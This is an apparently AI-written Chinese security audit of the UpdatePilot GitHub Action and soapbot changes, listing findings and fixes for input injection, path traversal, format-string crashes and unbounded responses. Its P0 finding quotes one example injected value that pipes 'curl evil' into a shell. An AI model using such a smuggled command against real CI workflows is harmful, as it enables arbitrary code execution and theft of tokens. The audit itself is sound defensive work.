# UpdatePilot v1.0.0 安全审计报告

**日期**：2026-11-18 · **审计人**：UpdatePilot 维护者（AI 代理，多技能交叉）
**方法**：code-vuln-crossreview（攻击者×建设者双视角）+ 云鼎三层扫描方法论 +
fullstack-dev 生产加固清单 + tdd（测试质量）+ orchestration（双代理并行收集证据）。
静态分析，不执行被审代码。

**审计范围**：updatepilot v1.0.0 全仓（9 模块 + tests + action.yml + CI），以及
soapbot 上次全审（2026-11-13）后的增量：控制面第二阶段（#85/#86）、AI 审查 v2
（#87）、dependabot 移除（#88）。

---

## 执行摘要

| 等级 | updatepilot v1.0.0 | soapbot 增量 | 状态 |
|---|---|---|---|
| 🔴 P0 | 1（action 注入面） | 0 | updatepilot 已修（本 PR） |
| 🟠 P1 | 4 | 2（已修，见 #89） | updatepilot 已修 / soapbot 已修 |
| 🟡 P2 | 4 | 3 | 登记，按 Roadmap 处理 |

Mimosa 装前拦截（开发期）已按建议修复 SSRF 三件套与路径穿越；本次为发布后首次
全量交叉审计。

---

## updatepilot v1.0.0

### 🔴 P0-1 action.yml `mode` 输入注入（已修）

- **位置**：action.yml `run: updatepilot ${{ inputs.mode }}`
- **触发路径**：GitHub Actions 先展开 `${{ }}` 再执行脚本。可复用 action 的输入按
  约定视为不可信——调用方的自动化里常见的 `mode: ${{ github.event.inputs.x }}` 模式
  会把 PR 分支名/事件文本送进 shell：`mode: scan; curl evil|sh` 即任意命令执行，
  且该 job 持有调用方的 `GITHUB_TOKEN` 与 `AI_REVIEW_API_KEY`。
- **修法（已落地）**：`${{ }}` 只进 env 块；脚本用 `case "$UPDATEPILOT_MODE" in
  scan|review)` 白名单，其余 fail closed。Install 步骤的 action_ref 同步 env 化。

### 🟠 P1-1 deleted 误判击穿诚实降级（已修，双仓同源）

- **位置**：updatepilot `review.py:211`、soapbot `scripts/ai_review.py:404-410`
- **触发路径**：判定树缺失文件是否"已删除"用 `count("\n-")`——而**真实 diff 的每一
  段都携带 `\n--- a/…` 头**，`\n-` 必然命中 → 任何树缺失的活文件都被标"已删除"
  （fully_read=True）→ 不触发"未完整读取"强制降级。Materialise 步骤一旦失效（fetch
  失败/目录错），整个审查静默滑向 safe。
- **修法（已落地）**：结构化判定 `"\n+++ /dev/null" in section`——只有真删除携带该
  标记。双仓同步修复 + 真实 diff 形状回归测试。

### 🟠 P1-2 `PinnedDependency.render` 的 format 崩溃（已修）

- **位置**：manifests.py:43-45
- **触发路径**：模板=原始行文本 + `{pin}` 占位，`str.format` 会对原行其它花括号求值
  （注释 `# see {docs}` → KeyError）→ bump 中断。`str.format` 对含属性链的花括号还
  有格式串注入面。
- **修法（已落地）**：改 `replace("{pin}", new_pin)`——纯文本替换无求值。

### 🟠 P1-3 响应体无上限（已修）

- **位置**：registries.py `_get_json`、github_action_latest、review.py call_model
- **触发路径**：被冒名/漂移的端点应答 GB 级响应 → 内存耗尽打挂 runner。
- **修法（已落地）**：`response.read(10MB)` 上限三处；超限 JSON 解析失败自然 fail
  closed。

### 🟠 P1-4 bumper 写路径无钳制（已修，加固）

- **位置**：bumper.py `repo_root / rel_file`——manifest 路径来自 adopter 配置，绝对
  路径/`..` 可越出仓库根写任意文件。
- **威胁评估**：配置是仓库所有者提交的，非攻击者直接可控 → 定级 P1 加固而非 P0。
- **修法（已落地）**：写路径接 review.safe_join（与审查器同一钳制）；写回补
  `errors="replace"` 与读侧对齐；gh.default_branch 输出（checkout_base / open_pr
  --base）接 validate_branch。

### 🟡 P2（登记，不阻断）

1. **配置的 manifests 路径无加载期校验**——bumper 已钳制，建议 load_config 时就拒
   绝 `..`/绝对路径（错误消息更早、更清晰）。
2. **测试盲区**：gh/registries/bumper/cli/versions 五模块无直接测试（本次已补关键
   回归，建议继续补 cli 端到端与 registries 的 egress 拒绝用例）。
3. **scan 模式审查的工作树是分支内容**——review_source_of_truth=working tree；
   建议改为 archive 已推分支（与 review 模式同源，消除对工作树状态的依赖）。
4. **action pip 安装未固定 commit SHA**——按 ref 安装是 composite action 惯例，但
   README 的接入示例应建议调用方用 SHA 钉住 `uses:`。

## soapbot 增量（#85–#88）

### 🟠 P1-5 /act 成功路径 SCREEN_OPS 记录崩溃（已修，PR #89）

- **位置**：memory/stages.py:994-999
- **触发路径**：`SCREEN_OPS.record(..., x=, y=, chars=)` 与 `OpsLog.record` 签名
  （action/outcome/session/plugin/frames/bytes/reason/by）不符 → **每次成功 /act 在
  注入已执行之后抛 TypeError**——动作生效但用户收到错误回复，且 SCREEN_OPS 只剩
  control.py 里的那条记录（stages 层的会话归属记录丢失）。
- **根因**：新增调用点未对齐既有 API 签名；测试盲区（_cmd_act 无任何测试）。
- **修法（已落地）**：对齐签名——会话归属与坐标/长度并入 `reason` 元数据字符串。

### 🟠 P1-6 ai_review deleted 误判（同 P1-1，已修）

### 🟡 P2（登记）

1. `/api/screen/hold` 三端点、`_cmd_act` 命令 stage 无测试（本次补）。
2. `ControlHolder` 无锁——hold 撤销与进行中动作有亚秒级 TOCTOU 窗口（急停现读闸不
   受影响：每次 act 的 gate.check 现读急停文件）；建议加 threading.Lock。
3. CONTROL 敏感配额 30/min 对"键鼠注入"偏宽（SCREEN/BROWSE 是读面，CONTROL 是写
   面）——建议单独收紧到 10/min 或在 hold 生效期间仍受限。
4. GET /ops 返回 kill 文件 reason（/panic 自由文本）——owner+Token 凭据限定 +
   Vue 转义，风险可接受；登记备忘。

---

## 云鼎三层扫描补充结论（对 updatepilot 全部 65+ 文件）

- 命令执行：subprocess 全部 argv 列表 + shell=False；唯一命中的 `chmod +x` 为
  Husky 文档示例（不对 updatepilot）。git/gh 调用点经 validate_branch（本次补齐
  default_branch 路径）。
- 网络请求：出站仅注册表（pypi.org/api.github.com，URL 模板固定 + quote）与模型
  端点（https+公网校验+禁重定向）。无第三方遥测。
- 依赖安装：action 按 ref 安装（composite 惯例）；README 建议调用方 SHA 钉住。
  pyproject 依赖为下界约束（packaging/PyYAML），装在 Actions runner 的一次性环境，
  风险可接受；建议后续锁定。
- 敏感路径：无 ~/.ssh/.env 读取；API key 只从 env 变量名读取。

## 结论

updatepilot v1.0.1 起修复全部 P0/P1；soapbot #89 修复两个 P1。剩余 P2 已登记进
Roadmap。**发布面（公开 action）的注入类问题列为最高优先级并在发现当日修复。**
